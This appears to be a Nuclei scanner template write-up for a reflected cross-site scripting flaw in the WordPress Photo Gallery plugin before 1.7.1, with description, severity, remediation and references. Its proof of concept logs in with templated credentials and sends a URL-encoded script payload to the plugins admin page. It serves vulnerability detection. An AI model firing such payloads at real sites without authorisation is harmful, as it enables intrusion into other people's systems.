# Nuclei Template: Photo Gallery < 1.7.1 - Cross-Site Scripting
**Template ID:** photo-gallery-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`photo-gallery-xss.yaml`)

## Vulnerability Information & PoC

## Description
The plugin does not escape some URLs before outputting them back in attributes, leading to Reflected Cross-Site Scripting.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/plugins.php?%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

## Remediation
This is resolved in release 1.7.1.

## References
- https://wpscan.com/vulnerability/e9f9bfb0-7cb8-4f92-b436-f08442a6c60a
- https://wordpress.org/plugins/photo-gallery/advanced/
